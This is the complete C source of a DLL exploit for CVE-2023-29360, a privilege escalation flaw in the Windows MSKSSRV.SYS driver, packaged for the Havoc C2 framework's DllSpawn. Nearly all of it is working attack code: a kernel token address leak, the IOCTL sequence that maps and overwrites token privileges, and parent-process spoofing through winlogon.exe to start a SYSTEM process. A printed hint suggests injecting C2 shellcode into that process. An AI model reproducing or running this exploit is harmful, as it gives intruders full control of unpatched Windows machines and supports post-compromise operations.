/*
 * CVE-2023-29360 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Vuln:   MSKSSRV.SYS (Microsoft Streaming Service) allows mapping
 *         arbitrary kernel pages to user-space via IOCTL sequence
 * Method: Map TOKEN._SEP_TOKEN_PRIVILEGES page to userspace RW
 *         -> enable all privileges (SeDebugPrivilege etc.)
 *         -> parent process spoofing via winlogon.exe -> SYSTEM
 *
 * Targets: Windows 10 / Windows 11 / Windows Server (pre-June 2023)
 * Patched: KB5027231 (June 2023 Patch Tuesday)
 *
 * Based on: original PoC by Nassim Asrir / n4sm
 *
 * Build: cl.exe /O2 /MT /LD exploit_dll.cpp /Fe:cve_2023_29360.dll
 *        /link advapi32.lib setupapi.lib ntdll.lib
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <setupapi.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ntdll.lib")

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Constants & IOCTL codes
 * ================================================================ */
#define IOCTL_IniContextRendezv   0x2F0400
#define IOCTL_InitializeStream    0x2F0404
#define IOCTL_RegisterStream      0x2F0420
#define IOCTL_PublishTx           0x2F0408
#define IOCTL_ConsumeTx           0x2F0410

/* TOKEN._SEP_TOKEN_PRIVILEGES offset - stable since Vista on x64 */
#define OFFSET_TOKEN_PRIVILEGES   0x40

/* MSKSSRV device GUID: {3C0D501A-140B-11D1-B40F-00A0C9223196} */
static const GUID KSNAME_Server_GUID =
    { 0x3C0D501A, 0x140B, 0x11D1, { 0xB4, 0x0F, 0x00, 0xA0, 0xC9, 0x22, 0x31, 0x96 } };

/* ================================================================
 * Structures for MSKSSRV IOCTLs
 * ================================================================ */
#pragma pack(push, 1)

typedef struct _MSKSSRV_INPUT {
    UINT64  Type;
    PVOID   CurrentProcId;
    UINT64  Flags;
    UINT64  qword18;
    UINT64  qword20;
    HANDLE  hEvent;
} MSKSSRV_INPUT;

typedef struct _MSKSSRV_IRP {
    UINT64  Type;
    PVOID   CurrentProcId;
    UINT64  Flags;
    HANDLE  hEvent;
} MSKSSRV_IRP;

typedef struct _PUBLISH_BUFFER {
    UINT64  size;
    UINT64  txsize;
    UINT64  rxsize;
    UINT32  txcount;
    UINT32  rxcount;
    UINT64  value;
    UINT64  value2;
    UINT64  virtualAddress1;
    UINT64  timestamp;
    UINT64  field9;
    UINT64  virtualAddress2;     /* RW mapped page target */
    UINT64  field10;
    UINT64  size1;
    UINT64  virtualAddress3;     /* R mapped page target */
    UINT64  size2;
    UINT32  Priority;
    UINT32  flag;
    UINT64  resolution;
    UINT64  field11;
    UINT64  field12;
    UINT64  format;
    UINT64  field13;
    UINT64  dimension;
    UINT64  field14;
    UINT8   reserved2[0x110];
} PUBLISH_BUFFER;

typedef struct _PUBLISH_OUT {
    UINT64  txsize;
    UINT64  rxsize;
    UINT32  txcount;
    UINT32  rxcount;
} PUBLISH_OUT;

typedef struct _CONSUME_OUT {
    UINT64  size;
    UINT64  txsize;
    UINT64  rxsize;
    UINT32  txcount;
    UINT32  rxcount;
    UINT64  value;
    UINT64  counter;
    UINT64  empty1;
    UINT64  empty2;
    UINT64  empty3;
    UINT8  *PageVaAddressRW;
    UINT64  empty5;
    UINT64  empty6;
    UINT8  *PageVaAddressR;
    UINT8   reserved2[0xF68];
} CONSUME_OUT;

#pragma pack(pop)

/* ================================================================
 * Handle enumeration
 * ================================================================ */
typedef struct _SYS_HANDLE_ENTRY {
    USHORT  UniqueProcessId;
    USHORT  CreatorBackTraceIndex;
    UCHAR   ObjectTypeIndex;
    UCHAR   HandleAttributes;
    USHORT  HandleValue;
    PVOID   Object;
    ULONG   GrantedAccess;
    LONG    __pad;
} SYS_HANDLE_ENTRY;

typedef struct _SYS_HANDLE_INFO {
    ULONG            NumberOfHandles;
    SYS_HANDLE_ENTRY Handles[1];
} SYS_HANDLE_INFO;

/* ================================================================
 * Globals
 * ================================================================ */
static wchar_t g_target[MAX_PATH] = L"notepad.exe";

/* ================================================================
 * FixStdout
 * ================================================================ */
static void FixStdout(void)
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == NULL || hOut == INVALID_HANDLE_VALUE) return;
    int fd = _open_osfhandle((intptr_t)hOut, _O_TEXT);
    if (fd < 0) return;
    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Open MSKSSRV device by interface GUID
 * (replaces KsOpenDefaultDevice to avoid Ksproxy.lib dependency)
 * ================================================================ */
static HANDLE OpenMskssrvDevice(void)
{
    HDEVINFO hDevInfo = SetupDiGetClassDevsW(
        &KSNAME_Server_GUID, NULL, NULL,
        DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);

    if (hDevInfo == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    SP_DEVICE_INTERFACE_DATA ifData;
    ifData.cbSize = sizeof(ifData);

    if (!SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &KSNAME_Server_GUID, 0, &ifData)) {
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return INVALID_HANDLE_VALUE;
    }

    DWORD needed = 0;
    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &ifData, NULL, 0, &needed, NULL);

    SP_DEVICE_INTERFACE_DETAIL_DATA_W *detail =
        (SP_DEVICE_INTERFACE_DETAIL_DATA_W*)HeapAlloc(GetProcessHeap(), 0, needed);
    if (!detail) {
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return INVALID_HANDLE_VALUE;
    }
    detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

    HANDLE hDev = INVALID_HANDLE_VALUE;
    if (SetupDiGetDeviceInterfaceDetailW(hDevInfo, &ifData, detail, needed, NULL, NULL)) {
        hDev = CreateFileW(detail->DevicePath,
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    }

    HeapFree(GetProcessHeap(), 0, detail);
    SetupDiDestroyDeviceInfoList(hDevInfo);
    return hDev;
}

/* ================================================================
 * MSKSSRV IOCTL wrappers
 * ================================================================ */
typedef NTSTATUS (NTAPI *fn_NtDeviceIoControlFile)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    ULONG, PVOID, ULONG, PVOID, ULONG);

static fn_NtDeviceIoControlFile pNtDeviceIoControlFile = NULL;
typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
static fn_NtQuerySystemInformation pNtQuerySystemInformation = NULL;

static BOOL NtLoad(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;
    pNtDeviceIoControlFile = (fn_NtDeviceIoControlFile)GetProcAddress(h, "NtDeviceIoControlFile");
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)GetProcAddress(h, "NtQuerySystemInformation");
    return (pNtDeviceIoControlFile && pNtQuerySystemInformation);
}

static BOOL IOCTL_InitContextRendezvous(HANDLE hDev)
{
    IO_STATUS_BLOCK iosb = {0};
    MSKSSRV_IRP buf = {0};
    buf.Type = 1;
    buf.CurrentProcId = (PVOID)(ULONG_PTR)GetCurrentProcessId();
    buf.Flags = 0x000000136FE7474DULL;

    NTSTATUS st = pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                                          IOCTL_IniContextRendezv,
                                          &buf, sizeof(buf), NULL, 0);
    return (st == 0);
}

static BOOL IOCTL_InitStream(HANDLE hDev)
{
    IO_STATUS_BLOCK iosb = {0};
    MSKSSRV_INPUT buf = {0};
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hEvent == INVALID_HANDLE_VALUE) return FALSE;

    buf.Type = 1;
    buf.CurrentProcId = (PVOID)(ULONG_PTR)GetCurrentProcessId();
    buf.Flags = 0x000000136FE7474DULL;
    buf.qword18 = ((UINT64)0x14 << 32);
    buf.qword20 = 0x40000;
    buf.hEvent  = hEvent;

    NTSTATUS st = pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                                          IOCTL_InitializeStream,
                                          &buf, sizeof(buf), NULL, 0);
    CloseHandle(hEvent);
    return (st == 0);
}

static BOOL IOCTL_RegisterStream(HANDLE hDev)
{
    IO_STATUS_BLOCK iosb = {0};
    MSKSSRV_INPUT buf = {0};
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hEvent == INVALID_HANDLE_VALUE) return FALSE;

    buf.Type = 2;
    buf.CurrentProcId = (PVOID)(ULONG_PTR)GetCurrentProcessId();
    buf.Flags = 0x000000136FE7474DULL;
    buf.qword18 = ((UINT64)0x14 << 32);
    buf.qword20 = 0x40000;
    buf.hEvent  = hEvent;

    NTSTATUS st = pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                                          IOCTL_RegisterStream,
                                          &buf, sizeof(buf), NULL, 0);
    CloseHandle(hEvent);
    return (st == 0);
}

static BOOL IOCTL_PublishTx(HANDLE hDev, UINT64 tokenPrivAddr)
{
    IO_STATUS_BLOCK iosb = {0};
    PUBLISH_BUFFER buf = {0};
    PUBLISH_OUT out = {0};

    buf.size            = sizeof(PUBLISH_BUFFER);
    buf.value           = ((UINT64)0x1 << 32) | (UINT64)0x3;
    buf.value2          = 0x1;
    buf.virtualAddress2 = tokenPrivAddr;    /* RW page */
    buf.virtualAddress3 = tokenPrivAddr;    /* R page */
    buf.size1           = ((UINT64)0x1000 << 32) | (UINT64)0x140;
    buf.size2           = ((UINT64)0x1000 << 32) | (UINT64)0x140;
    buf.flag            = 0x10000000;
    buf.Priority        = 0x00000004;

    NTSTATUS st = pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                                          IOCTL_PublishTx,
                                          &buf, sizeof(buf), &out, sizeof(out));
    if (st == 0) {
        printf("[+] PublishTx OK [tx:%llu rx:%llu]\n",
               (unsigned long long)out.txsize, (unsigned long long)out.rxsize);
    }
    return (st == 0);
}

static BOOL IOCTL_ConsumeTx(HANDLE hDev, UINT8 **ppMapped)
{
    IO_STATUS_BLOCK iosb = {0};
    CONSUME_OUT buf = {0};

    PVOID ioBuf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ioBuf) return FALSE;

    buf.size  = 0x1000;
    buf.value = 0x6;
    memcpy(ioBuf, &buf, sizeof(buf) < 0x1000 ? sizeof(buf) : 0x1000);

    NTSTATUS st = pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                                          IOCTL_ConsumeTx,
                                          ioBuf, sizeof(CONSUME_OUT),
                                          ioBuf, sizeof(CONSUME_OUT));
    if (st == 0) {
        memcpy(&buf, ioBuf, sizeof(buf));
        *ppMapped = buf.PageVaAddressRW;
        printf("[+] ConsumeTx OK -> mapped RW: %p\n", buf.PageVaAddressRW);
    }

    VirtualFree(ioBuf, 0, MEM_RELEASE);
    return (st == 0);
}

/* ================================================================
 * Get kernel TOKEN address via handle enumeration
 * ================================================================ */
static UINT64 GetTokenAddress(void)
{
    HANDLE hToken = NULL;
    UINT64 addr = 0;
    ULONG size = 0;
    NTSTATUS st;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return 0;

    SYS_HANDLE_INFO *pInfo = NULL;
    while ((st = pNtQuerySystemInformation(0x10, pInfo, size, &size))
            == (NTSTATUS)0xC0000004L) {
        if (pInfo)
            pInfo = (SYS_HANDLE_INFO*)realloc(pInfo, 2 * (SIZE_T)size);
        else
            pInfo = (SYS_HANDLE_INFO*)calloc(1, 2 * (SIZE_T)size);
        if (!pInfo) { CloseHandle(hToken); return 0; }
    }

    if (st == 0) {
        DWORD pid = GetCurrentProcessId();
        for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
            if (pInfo->Handles[i].UniqueProcessId == (USHORT)pid &&
                (ULONG_PTR)pInfo->Handles[i].HandleValue == (ULONG_PTR)hToken) {
                addr = (UINT64)pInfo->Handles[i].Object;
                break;
            }
        }
    }

    free(pInfo);
    CloseHandle(hToken);
    return addr;
}

/* ================================================================
 * Find PID by process name
 * ================================================================ */
static DWORD FindProcessId(const wchar_t *name)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

/* ================================================================
 * Check if running as SYSTEM
 * ================================================================ */
static BOOL IsSystem(void)
{
    HANDLE hToken = NULL;
    BOOL result = FALSE;
    DWORD size = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
    if (size == 0) { CloseHandle(hToken); return FALSE; }

    TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!tu) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenUser, tu, size, &size)) {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID sysSid = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &sysSid)) {
            result = EqualSid(tu->User.Sid, sysSid);
            FreeSid(sysSid);
        }
    }

    HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hToken);
    return result;
}

/* ================================================================
 * Spawn process as SYSTEM via parent spoofing (winlogon.exe)
 * ================================================================ */
static BOOL SpawnAsSystem(const wchar_t *target)
{
    DWORD winlogonPid = FindProcessId(L"winlogon.exe");
    if (winlogonPid == 0) {
        printf("[-] winlogon.exe not found\n");
        return FALSE;
    }

    HANDLE hWinlogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPid);
    if (!hWinlogon) {
        printf("[-] OpenProcess(winlogon): %u\n", GetLastError());
        return FALSE;
    }
    printf("[+] Opened winlogon.exe PID %u\n", winlogonPid);

    SIZE_T attrSize = 0;
    STARTUPINFOEXW siex = {0};
    siex.StartupInfo.cb = sizeof(siex);
    siex.StartupInfo.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attrSize);
    if (!siex.lpAttributeList) {
        CloseHandle(hWinlogon);
        return FALSE;
    }

    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize);
    UpdateProcThreadAttribute(siex.lpAttributeList, 0,
                              PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hWinlogon, sizeof(hWinlogon), NULL, NULL);

    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[MAX_PATH];
    lstrcpynW(cmd, target, MAX_PATH);

    printf("[*] Spawning: %S (parent: winlogon.exe)\n", target);

    BOOL ok = CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                              EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                              NULL, NULL, (LPSTARTUPINFOW)&siex, &pi);

    if (ok) {
        printf("\n");
        printf("[+] ==================================\n");
        printf("[+]  SYSTEM process created!\n");
        printf("[+]  Process: %S\n", target);
        printf("[+]  PID:     %u\n", pi.dwProcessId);
        printf("[+] ==================================\n\n");
        printf("[*] Next: shinject %u x64 <listener>\n", pi.dwProcessId);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        printf("[-] CreateProcessW: %u\n", GetLastError());
    }

    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
    CloseHandle(hWinlogon);
    return ok;
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void)
{
    HANDLE hDev1 = INVALID_HANDLE_VALUE;
    HANDLE hDev2 = INVALID_HANDLE_VALUE;
    HANDLE hDev3 = INVALID_HANDLE_VALUE;

    printf("[*] CVE-2023-29360 - MSKSSRV.SYS LPE\n");
    printf("[*] Target process: %S\n\n", g_target);

    if (IsSystem()) {
        printf("[+] Already SYSTEM!\n");
        goto spawn;
    }

    if (!NtLoad()) {
        printf("[-] ntdll resolve failed\n");
        return FALSE;
    }
    printf("[+] ntdll OK\n");

    /* Open 3 handles to MSKSSRV device */
    printf("[*] Opening MSKSSRV device...\n");
    hDev1 = OpenMskssrvDevice();
    hDev2 = OpenMskssrvDevice();
    hDev3 = OpenMskssrvDevice();

    if (hDev1 == INVALID_HANDLE_VALUE ||
        hDev2 == INVALID_HANDLE_VALUE ||
        hDev3 == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open MSKSSRV device\n");
        printf("[-] mskssrv.sys may not be loaded\n");
        printf("[-] Try: sc start MSKSSRV\n");
        if (hDev1 != INVALID_HANDLE_VALUE) CloseHandle(hDev1);
        if (hDev2 != INVALID_HANDLE_VALUE) CloseHandle(hDev2);
        if (hDev3 != INVALID_HANDLE_VALUE) CloseHandle(hDev3);
        return FALSE;
    }
    printf("[+] MSKSSRV handles: %p %p %p\n", hDev1, hDev2, hDev3);

    /* Get kernel TOKEN address */
    UINT64 tokenAddr = GetTokenAddress();
    if (tokenAddr == 0) {
        printf("[-] Failed to get kernel TOKEN address\n");
        goto cleanup;
    }

    UINT64 privAddr = tokenAddr + OFFSET_TOKEN_PRIVILEGES;
    printf("[+] TOKEN address:    0x%llx\n", (unsigned long long)tokenAddr);
    printf("[+] Privileges addr:  0x%llx\n", (unsigned long long)privAddr);

    /* IOCTL sequence */
    printf("[*] InitializeContextRendezvous...\n");
    if (!IOCTL_InitContextRendezvous(hDev1)) {
        printf("[-] InitializeContextRendezvous failed\n");
        goto cleanup;
    }

    printf("[*] InitializeStream...\n");
    if (!IOCTL_InitStream(hDev2)) {
        printf("[-] InitializeStream failed\n");
        goto cleanup;
    }

    printf("[*] RegisterStream...\n");
    if (!IOCTL_RegisterStream(hDev3)) {
        printf("[-] RegisterStream failed\n");
        goto cleanup;
    }

    /* PublishTx: maps kernel TOKEN.Privileges page to userspace */
    printf("[*] PublishTx (mapping kernel page to userspace)...\n");
    if (!IOCTL_PublishTx(hDev3, privAddr)) {
        printf("[-] PublishTx failed (patched?)\n");
        goto cleanup;
    }

    /* ConsumeTx: get the userspace mapped address */
    UINT8 *mappedAddr = NULL;
    printf("[*] ConsumeTx (getting mapped address)...\n");
    if (!IOCTL_ConsumeTx(hDev3, &mappedAddr)) {
        printf("[-] ConsumeTx failed\n");
        goto cleanup;
    }

    if (mappedAddr == NULL) {
        printf("[-] Mapped address is NULL\n");
        goto cleanup;
    }

    /* Enable ALL token privileges */
    printf("[*] Enabling ALL token privileges at %p...\n", mappedAddr);
    memset(mappedAddr, 0xFF, 0x10);
    printf("[+] Token privileges enabled!\n");

    /* Verify: try to open winlogon.exe (requires SeDebugPrivilege) */
    {
        DWORD wlPid = FindProcessId(L"winlogon.exe");
        HANDLE hTest = OpenProcess(PROCESS_ALL_ACCESS, FALSE, wlPid);
        if (hTest) {
            printf("[+] SeDebugPrivilege confirmed (opened winlogon.exe)\n");
            CloseHandle(hTest);
        } else {
            printf("[-] Privilege escalation may have failed\n");
            goto cleanup;
        }
    }

    CloseHandle(hDev1); CloseHandle(hDev2); CloseHandle(hDev3);
    hDev1 = hDev2 = hDev3 = INVALID_HANDLE_VALUE;

spawn:
    return SpawnAsSystem(g_target);

cleanup:
    if (hDev1 != INVALID_HANDLE_VALUE) CloseHandle(hDev1);
    if (hDev2 != INVALID_HANDLE_VALUE) CloseHandle(hDev2);
    if (hDev3 != INVALID_HANDLE_VALUE) CloseHandle(hDev3);
    return FALSE;
}

/* ================================================================
 * Check mode
 * ================================================================ */
static void DoCheck(void)
{
    printf("[*] CVE-2023-29360 - Pre-flight Check\n\n");

    /* OS version */
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (hNt) {
        RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(hNt, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW vi;
            ZeroMemory(&vi, sizeof(vi));
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0) {
                printf("[*] OS: Windows %lu.%lu Build %lu\n",
                       vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
            }
        }
    }

    printf(IsSystem() ? "[+] Already SYSTEM\n" : "[*] Not SYSTEM (normal user)\n");

    if (!NtLoad()) {
        printf("[-] ntdll resolve failed\n");
        return;
    }
    printf("[+] ntdll OK\n");

    /* Try to open device */
    HANDLE hDev = OpenMskssrvDevice();
    if (hDev != INVALID_HANDLE_VALUE) {
        printf("[+] MSKSSRV device: ACCESSIBLE (mskssrv.sys loaded)\n");
        CloseHandle(hDev);
    } else {
        printf("[-] MSKSSRV device: NOT accessible\n");
        printf("    Try: sc start MSKSSRV\n");
    }

    /* TOKEN leak test */
    UINT64 tok = GetTokenAddress();
    if (tok)
        printf("[+] Current TOKEN: 0x%llx\n", (unsigned long long)tok);
    else
        printf("[-] Handle enumeration failed\n");

    printf("\n[*] Check complete\n");
}

/* ================================================================
 * Parse arguments
 * ================================================================ */
static void ParseArgs(const char *args)
{
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;

    if (strncmp(args, "run", 3) == 0) {
        const char *p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_target, MAX_PATH);
            int len = lstrlenW(g_target);
            while (len > 0 && (g_target[len-1] == L' ' ||
                               g_target[len-1] == L'\r' ||
                               g_target[len-1] == L'\n'))
                g_target[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        FixStdout();

        const char *args = NULL;
        if (lpvReserved && ((const char*)lpvReserved)[0] != '\0')
            args = (const char*)lpvReserved;

        printf("[cve-2023-29360] args: %s\n\n", args ? args : "(none)");

        if (args && strncmp(args, "check", 5) == 0)
            DoCheck();
        else {
            ParseArgs(args);
            DoExploit();
        }

        printf("\n[cve-2023-29360] Done\n");
        fflush(stdout);
    }
    return TRUE;
}

/* ================================================================
 * StartW / Start - rundll32 compatibility
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    FixStdout();
    char buf[512] = {0};
    if (cmd && cmd[0])
        WideCharToMultiByte(CP_ACP, 0, cmd, -1, buf, 511, NULL, NULL);
    if (buf[0] && strncmp(buf, "check", 5) == 0) DoCheck();
    else { ParseArgs(buf[0] ? buf : NULL); DoExploit(); }
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    FixStdout();
    if (cmd && cmd[0] && strncmp(cmd, "check", 5) == 0) DoCheck();
    else { ParseArgs(cmd); DoExploit(); }
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
